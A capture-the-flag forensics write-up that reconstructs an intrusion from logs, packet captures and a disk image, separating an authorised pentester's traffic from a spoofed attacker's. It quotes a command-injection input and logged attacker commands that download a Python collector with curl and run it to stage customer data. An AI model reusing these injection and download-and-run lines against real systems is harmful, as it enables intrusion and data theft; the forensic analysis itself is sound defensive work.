# Rules of Engagement — Writeup

## Reconnaissance

The challenge archive contained:

- Three network captures under `player-release/pcaps/`
- Supporting EDGE01 and DB01 logs
- `ROE_ACME_2026.pdf`, the engagement rules
- `PROD-WEB01.img`, a forensic disk image

First, inspect the challenge description and archive contents:

```sh
sed -n '1,240p' challInfo.md
unzip -l 'dist-Rules of Engagement.zip'
```

Extract the smaller evidence files for analysis:

```sh
mkdir -p /tmp/roe
unzip -q 'dist-Rules of Engagement.zip' \
  'player-release/pcaps/*' \
  'player-release/supporting-logs/*' \
  'ROE_ACME_2026.pdf' -d /tmp/roe
pdftotext /tmp/roe/ROE_ACME_2026.pdf -
```

The ROE document identifies `198.51.100.27` as the authorized assessor source and explicitly excludes production edge IP `198.51.100.10`.

## Network and application analysis

Review the EDGE01 access and egress logs:

```sh
sed -n '1,240p' /tmp/roe/player-release/supporting-logs/EDGE01/roe_access.jsonl
sed -n '1,240p' /tmp/roe/player-release/supporting-logs/EDGE01/roe_egress.jsonl
```

The access log shows the pentester contacting production at:

```text
host: 198.51.100.10
remote_addr: 198.51.100.27
```

The first diagnostic request uses the target:

```text
localhost; /usr/bin/id
```

This is command injection through the diagnostics endpoint. The response identifies the executing account:

```text
uid=999(ibohweb) gid=988(ibohweb) groups=988(ibohweb)
```

Therefore, the injected command ran as `ibohweb`.

The stop acknowledgement was recorded at `05:44:59Z`. After that timestamp, four diagnostic requests were logged at `05:45:07Z`, all carrying the authorized assessor address through X-Forwarded-For but arriving from `203.0.113.77`. They were therefore falsely attributed to the pentester.

The relevant requests were:

```text
/usr/bin/curl -fsS http://10.88.20.10:8080/tools/collector.py -o /var/log/iboh-roe/.collector.py
/usr/bin/python3 /var/log/iboh-roe/.collector.py sample 1297db712c70
/usr/bin/python3 /var/log/iboh-roe/.collector.py bulk 1297db712c70
/usr/bin/python3 /var/log/iboh-roe/.collector.py stage 1297db712c70
```

The internal packet capture makes the command injection and downloaded Python utility directly visible:

```sh
tshark -r /tmp/roe/player-release/pcaps/EDGE01_Internal.pcap \
  -Y 'http' -T fields \
  -e frame.time -e ip.src -e ip.dst -e http.request.method \
  -e http.host -e http.request.uri -e http.response.code -e http.file_data
```

The downloaded utility's `sample()` function invokes `psql` using this absolute path:

```python
subprocess.run([
    '/usr/bin/psql', ...
])
```

Thus the executable path is `/usr/bin/psql`.

## Reconstructing the rejected archive hash

The collector source builds the rejected bulk archive from:

```python
data = b'ACME synthetic archive fixture\n' + b'A' * 131072
```

It writes that data into a tar member named `synthetic_archive_test.txt`, then uploads the resulting 133120-byte tar archive. Recreate the archive and hash it:

```sh
python3 - <<'PY'
import hashlib
import io
import tarfile

payload = b'ACME synthetic archive fixture\n' + b'A' * 131072
out = io.BytesIO()

with tarfile.open(fileobj=out, mode='w') as tf:
    info = tarfile.TarInfo('synthetic_archive_test.txt')
    info.size = len(payload)
    tf.addfile(info, io.BytesIO(payload))

print(hashlib.sha256(out.getvalue()).hexdigest())
PY
```

The result is:

```text
6232b75fd3a1c97b1819c0fb9406a3d6677924186c28de3d0004b25c4675f4c4
```

## Disk-image analysis

Extract the disk image and inspect its partition table:

```sh
unzip -p 'dist-Rules of Engagement.zip' \
  'player-release/PROD-WEB01.img' > /tmp/prod-roe.img
fdisk -l /tmp/prod-roe.img
```

The Linux filesystem begins at sector `2097280`, so use that offset with The Sleuth Kit tools:

```sh
fls -r -o 2097280 /tmp/prod-roe.img | \
  rg 'iboh-roe|sys-update|customers_full|audit'
```

This identifies the relevant files, including:

- `/var/log/iboh-roe/.sys-update`
- `/var/log/audit/audit.log`
- `/var/log/iboh-roe/customers_full.tar`

Read the audit log and locate the staging command:

```sh
icat -o 2097280 /tmp/prod-roe.img 262407 | \
  rg -n -C 3 'collector.py stage|a2="stage"|pid=2151'
```

The audit record shows:

```text
type=SYSCALL ... pid=2151 ... comm="python3"
type=EXECVE ... a0="/usr/bin/python3" ... a2="stage"
```

Therefore, PID `2151` executed the staging operation.

## Final flag

The six answers are:

```text
198.51.100.10
ibohweb
4
/usr/bin/psql
6232b75fd3a1c97b1819c0fb9406a3d6677924186c28de3d0004b25c4675f4c4
2151
```

Final flag:

```text
IBOH26{redacted}
```
